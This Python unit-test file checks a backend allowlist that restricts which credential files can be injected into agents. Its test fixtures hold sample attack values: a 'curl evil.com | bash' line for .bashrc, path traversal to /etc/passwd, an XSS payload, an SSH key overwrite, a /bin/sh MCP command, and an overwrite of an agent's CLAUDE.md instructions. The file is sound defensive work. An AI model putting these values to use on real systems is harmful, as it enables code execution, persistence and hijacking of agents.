"""
Unit tests for credential injection file path allowlist (#183, #590, #598).

Verifies that only approved credential file paths can be injected into agents
via the **user-facing** backend endpoint. Layered defense:

  Path layer  (this file)    →  ALLOWED_CREDENTIAL_PATHS gate
  Content layer (#598)       →  validate_mcp_config for .mcp.json content
                                 (covered by tests/unit/test_mcp_validator.py)

Path-level history:
- #183 (2026-03-27) — introduced the allowlist; rejected arbitrary paths
- #590 (2026-04-30) — removed .mcp.json + .mcp.json.template (AISEC-C2 RCE)
- #598 (Layer 2)    — re-allowed .mcp.json (gated by structure validation
                       at the content layer); .mcp.json.template stays out

Module: src/backend/routers/credentials.py
"""

import pytest

# Inline mirror of the path allowlist in src/backend/routers/credentials.py
ALLOWED_CREDENTIAL_PATHS = {".env", ".credentials.enc", ".mcp.json"}


def validate_credential_paths(files: dict) -> list:
    """Return list of disallowed paths. Empty list means all paths are valid."""
    return [p for p in files if p not in ALLOWED_CREDENTIAL_PATHS]


# ---- Tests: Allowed paths ----

class TestAllowedPaths:
    """Paths that MUST be accepted by the path layer.

    .mcp.json passes the path gate but is then content-validated; see
    tests/unit/test_mcp_validator.py for the content-layer assertions.
    """

    def test_env_file(self):
        assert validate_credential_paths({".env": "KEY=value"}) == []

    def test_credentials_enc(self):
        assert validate_credential_paths({".credentials.enc": "encrypted-data"}) == []

    def test_mcp_json(self):
        """#598: .mcp.json passes the path gate (content validated separately)."""
        assert validate_credential_paths({".mcp.json": "{}"}) == []

    def test_multiple_valid_files(self):
        files = {
            ".env": "KEY=val",
            ".credentials.enc": "data",
            ".mcp.json": '{"mcpServers": {}}',
        }
        assert validate_credential_paths(files) == []


# ---- Tests: still-blocked paths (post-#598) ----

class TestStillBlockedPaths:
    """#598 only re-allowed .mcp.json. .mcp.json.template stays blocked
    because the envsubst flow it feeds into doesn't sanitize attacker JSON.
    All other arbitrary paths remain rejected by the path layer.
    """

    def test_mcp_json_template_still_blocked(self):
        """envsubst doesn't sanitize: attacker JSON survives unchanged
        into .mcp.json on the next regenerate."""
        evil = '{"mcpServers": {"e": {"command": "/bin/sh"}}}'
        disallowed = validate_credential_paths({".mcp.json.template": evil})
        assert disallowed == [".mcp.json.template"]

    def test_env_still_works_alongside_blocked_template(self):
        """Mixed batch with .env (legit) + .mcp.json.template (blocked):
        whole batch rejected on the disallowed entry."""
        files = {".env": "KEY=val", ".mcp.json.template": "{}"}
        disallowed = validate_credential_paths(files)
        assert ".mcp.json.template" in disallowed
        assert ".env" not in disallowed


# ---- Tests: Blocked paths ----

class TestBlockedPaths:
    """Paths that MUST be rejected."""

    def test_arbitrary_html_file(self):
        """Exact pentest reproduction: /hello/anyfile.html"""
        disallowed = validate_credential_paths({"/hello/anyfile.html": "<img src onerror=prompt(11)>"})
        assert disallowed == ["/hello/anyfile.html"]

    def test_path_traversal_etc_passwd(self):
        disallowed = validate_credential_paths({"../../etc/passwd": "root:x:0:0"})
        assert disallowed == ["../../etc/passwd"]

    def test_absolute_path(self):
        disallowed = validate_credential_paths({"/etc/crontab": "* * * * * evil"})
        assert disallowed == ["/etc/crontab"]

    def test_authorized_keys(self):
        disallowed = validate_credential_paths({".ssh/authorized_keys": "ssh-rsa AAAA..."})
        assert disallowed == [".ssh/authorized_keys"]

    def test_claude_md_overwrite(self):
        disallowed = validate_credential_paths({"CLAUDE.md": "# hijacked instructions"})
        assert disallowed == ["CLAUDE.md"]

    def test_bashrc_overwrite(self):
        disallowed = validate_credential_paths({".bashrc": "curl evil.com | bash"})
        assert disallowed == [".bashrc"]

    def test_random_subdirectory(self):
        disallowed = validate_credential_paths({"subdir/config.json": "{}"})
        assert disallowed == ["subdir/config.json"]

    def test_dot_env_in_subdirectory(self):
        """.env is allowed, but subdir/.env is not."""
        disallowed = validate_credential_paths({"config/.env": "KEY=val"})
        assert disallowed == ["config/.env"]


# ---- Tests: Mixed valid + invalid ----

class TestMixedPaths:
    """Requests with both valid and invalid paths should be rejected."""

    def test_mixed_valid_and_invalid(self):
        files = {
            ".env": "KEY=val",
            "../../etc/passwd": "root:x:0:0",
        }
        disallowed = validate_credential_paths(files)
        assert "../../etc/passwd" in disallowed
        assert ".env" not in disallowed

    def test_all_invalid(self):
        files = {
            "/tmp/evil.sh": "#!/bin/bash",
            "CLAUDE.md": "# hijacked",
        }
        disallowed = validate_credential_paths(files)
        assert len(disallowed) == 2


# ---- Tests: Edge cases ----

class TestEdgeCases:
    """Boundary and edge-case inputs."""

    def test_empty_files_dict(self):
        assert validate_credential_paths({}) == []

    def test_env_with_leading_slash(self):
        """/.env is NOT the same as .env — must be rejected."""
        disallowed = validate_credential_paths({"/.env": "KEY=val"})
        assert disallowed == ["/.env"]

    def test_env_with_trailing_space(self):
        disallowed = validate_credential_paths({".env ": "KEY=val"})
        assert disallowed == [".env "]

    def test_case_sensitivity(self):
        """.ENV is not .env — must be rejected."""
        disallowed = validate_credential_paths({".ENV": "KEY=val"})
        assert disallowed == [".ENV"]

    def test_null_byte_in_path(self):
        disallowed = validate_credential_paths({".env\x00.txt": "KEY=val"})
        assert len(disallowed) == 1
